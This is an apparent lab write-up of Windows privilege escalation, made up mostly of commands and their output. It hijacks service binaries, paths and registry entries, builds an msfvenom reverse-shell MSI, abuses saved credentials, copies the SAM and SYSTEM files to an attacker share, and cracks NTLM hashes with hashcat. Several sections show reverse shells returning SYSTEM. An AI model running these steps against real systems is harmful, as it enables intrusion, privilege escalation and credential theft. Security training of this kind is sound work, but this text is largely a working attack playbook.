**`Service Exploits - Insecure Service Permissions`**

```bash
C:\PrivEsc>accesschk.exe /accepteula -uwcqv user daclsvc
accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG
	SERVICE_CHANGE_CONFIG
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START
	SERVICE_STOP
	READ_CONTROL

```

user have ability to change `SERVICE_CHANGE_CONFIG` 

```bash
C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


```
service start using `SYSTEM privilege` (`SERVICE_START_NAME`)

- Exploit 

1- change binpath (`BINARY_PATH_NAME`)  to payload <br>

```bash

C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\rev.exe\""
sc config daclsvc binpath= "\"C:\PrivEsc\rev.exe\""
[SC] ChangeServiceConfig SUCCESS

```

2- run service
```bash
net start daclsvc
```

```bash
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.27.238 49751 received!
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```




**`Service Exploits - Unquoted Service Path`**



- check which privilege that run service

```bash
C:\PrivEsc>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

service start using `SYSTEM privilege` (`SERVICE_START_NAME`)

- check permission 

```bash
C:\PrivEsc>accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

`BUILTIN\Users group is allowed to write`

- copy payload to writable dir and named `Common.exe` as Common dir  under `Unquoted path`

- Start Service

```bash
C:\PrivEsc>net start unquotedsvc
net start unquotedsvc
```


```bash
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.27.238 49778 received!
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```



**`Service Exploits - Weak Registry Permissions`**


- check registry service

```bash
sc>sc qc regsvc
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


```

service run with system privilege `SERVICE_START_NAME : LocalSystem`

- check if this registry entry its writable

```bash
C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

it's writable by `NT AUTHORITY\INTERACTIVE` group which means all logged-on users.

- Edit registry 

```bash
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\rev.exe /f

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\rev.exe /f
The operation completed successfully.
```

- run service

```bash
C:\PrivEsc>net start regsvc
net start regsvc
```

```bash
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.27.238 49825 received!
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```



**`Service Exploits - Insecure Service Executables`**

- check service  run with permission

```bash
>sc qc filepermsvc
sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

service run with system privilege `SERVICE_START_NAME : LocalSystem`

- check service permission.

```bash
C:\PrivEsc>accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
	FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	FILE_ALL_ACCESS
  RW BUILTIN\Administrators
	FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
	FILE_ALL_ACCESS
  RW BUILTIN\Users
	FILE_ALL_ACCESS
```

binary service its writable by everyone ` RW Everyone`

- replace service binary with payload.

```bash
copy C:\PrivEsc\rev.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

- run service

```bash
net start filepermsvc
```

```bash
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.27.238 49863 received!
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```



**`Registry - AutoRuns`**

- check auto run registry

```bash
C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run



reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"




```

- check binary permissions

```bash
C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
	FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	FILE_ALL_ACCESS
  RW BUILTIN\Administrators
	FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
	FILE_ALL_ACCESS
  RW BUILTIN\Users
	FILE_ALL_ACCESS


```

it's writable by everyone ` RW Everyone`

- replace binary file with payload

```bash

C:\PrivEsc\rev.exe "C:\Program Files\Autorun Program\program.exe" /Y

copy C:\PrivEsc\rev.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.

```

- login in through rdp to trigger auto run binary.

d
```bash
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.27.238 49863 received!
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```


**`Registry - AlwaysInstallElevated`**

- check AlwaysInstallElevated keys

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

if keys are set to 1 (0x1) then we can exploit this missconfig.

- create msi payload

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.2.15 LPORT=4444 -f msi -o reverse.msi`

- run installer

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

**`Passwords - Registr`**

password store in registry 

- search for password keyword in registry.

`reg query HKLM /f password /t REG_SZ /s`
`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`


**`Passwords- Saved Creds`**

- list all saved password.

`cmdkey /list`

- run payload through runas with savecred option.

`runas /savecred /user:admin C:\Temp\payload.exe`



**`Passwords - Security Account Manager (SAM)`**

some misconfig store sam and system file in ` C:\Windows\Repair\`

- copy both files (sam&system) from ` C:\Windows\Repair\` to kali vm.

`copy C:\Windows\Repair\SAM \\10.10.2.10\kali\`  
`copy C:\Windows\Repair\SYSTEM \\10.2.10.10\kali\`

- clone creddump7 

`git clone https://github.com/Tib3rius/creddump7`
`pip3 install pycrypto`
`python3 creddump7/pwdump.py SYSTEM SAM`

- Crack NTLM hash

`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`


**` Passwords - Passing the Hash`**

- psexec
- pth-winexe

**`Scheduled Tasks`**

scheduled task like cron job in linux.

- list scheduled tasks

`Get-ScheduledTask`
`schtasks /query`

- check file permission

`icacls C:\DevTools\CleanUp.ps1`
`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
writable everyone.

- edit  `CleanUp.ps1` 

`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`



**`StartUp Apps`**

- check startup directory.

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`


- create shortcut for payload.

 `C:\PrivEsc\CreateShortcut.vbs`  -> `rev.exe`

`cscript C:\PrivEsc\CreateShortcut.vbs`




